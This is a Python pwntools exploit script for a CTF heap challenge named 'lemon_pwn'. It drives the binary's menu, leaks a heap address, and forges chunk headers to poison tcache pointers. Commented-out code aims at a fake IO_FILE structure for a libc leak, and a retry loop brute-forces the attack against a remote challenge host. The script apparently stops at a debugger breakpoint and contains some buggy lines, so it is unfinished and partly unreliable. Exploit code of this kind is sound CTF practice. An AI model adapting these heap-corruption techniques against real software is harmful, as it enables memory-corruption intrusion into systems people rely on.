# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
context.log_level = 'debug' 
context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './lemon_pwn'
elf = ELF(binary)
libc = elf.libc
#libc = ELF('')
context.binary = binary
DEBUG = 1
if DEBUG:
    p = process(binary)
    libc = elf.libc
    #p = process(['qemu-arm', binary])
    #p = process(['qemu-aarch64','-L','',binary])
    #p = process(['qemu-aarch64','-L','',-g,'1234',binary])
else:
    host = '47.104.70.90'
    port = '34524'
    p = remote(host,port)

l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def exhaust( pwn ):
    global p
    i = 0
    while 1 :
        try:
            i+=1
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def one_gadget(filename):
    log.progress('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('>>',num)

def add(idx,name,size,content):
    cmd(1)
    sla('index of your lemon: ',idx)
    sa('Now, name your lemon: ',name)
    sla('message for you lemon: ',size)
    sa('your message: ',content)

def eadd(idx,name,size = 0x600):
    cmd(1)
    sla('index of your lemon: ',idx)
    sa('Now, name your lemon: ',name)
    sla('message for you lemon: ',size)

def delete(idx):
    cmd(3)
    sla('index of your lemon : ',idx)

def show(idx):
    cmd(2)
    sla('index of your lemon : ',idx)

def edit(idx,content):
    cmd(4)
    sla('Input the index of your lemon  : ',idx)
    sa('draw and color!',content)

def attack():
    # one_gad = one_gadget(libc.path)

    '''sla('with me?','yes')
    # dbg()
    sa('lucky number: ',0x700048)
    ru('tell me you name first:')
    # dbg('close')

    se('a'*21)
    ru('is 0x')
    stack_low_addr = rint(3)
    lg('stack_low_addr',stack_low_addr)'''

    sla('with me?','g')

    add(0 , 'a'*0x10 , 0x248,'a')
    add(1 , 'a'*0x10 , 0x248,'a')
    delete(1)
    delete(0)
    add(0 , 'a'*0x10 , 0x40 , 'a' )
    show(0)
    ru('eat eat eat ')
    addr = int(p.recvuntil('.')[:-1]) + 0x50
    lg('addr',addr)

    add(1 , 'a'*0x10 , 0x48,'a')
    add(2 , 'a'*0x10 , 0x48,'a')
    add(3 , 'a'*0x10 , 0x48,'a')

    fake = flat( 0 ,0,0,0 ,0 , 0x251) +p16(addr & 0xf000 + 0x10)
    edit(0 ,fake )
    add( 0 , 'a'*0x10 , 0x248 , '\x07'*0x40 )
    add( 0 , 'a'*0x10 , 0x248 , '\x07'*0x40 )
    delete(0)
    # delete(1)
    add( 0 , 'a'*0x10 , 0x28 , '\x00' )
    delete(1)
    # payload = flat()
    add( 1 , 'a' , 0x28 , p16(0xb720) )
    low_addr = 0x96dd
    delete(2)
    dbg()

    '''add( 2 , 'a'*0x10 , 0x98 , p64(0) +p16(low_addr) )
    fake_io = "aaa" + "\x00"*0x30 + p64(0xfbad1800) + p64(0)*3 + "\x00"
    delete(3)
    dbg()
    add( 3 , 'a'*0x10 , 0x68 ,fake_io )'''


    p.interactive()


exhaust(attack)

'''
@File    :   lemon_pwn.py
@Time    :   2021/08/21 11:59:54
@Author  :   Niyah 
'''